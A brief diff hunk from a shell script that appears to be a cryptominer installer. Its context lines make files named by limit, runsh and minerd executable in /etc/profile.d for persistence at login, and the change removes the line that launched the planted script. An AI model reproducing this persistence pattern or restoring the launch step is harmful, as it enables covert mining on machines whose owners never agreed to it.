@@ -78,7 +78,6 @@ fi
 	chmod +x "/etc/profile.d/${limit}"
 	chmod +x "/etc/profile.d/${runsh}"
 	chmod +x "/etc/profile.d/${minerd}"
-	cd /etc/profile.d && "./$runsh"
 fi
 
 
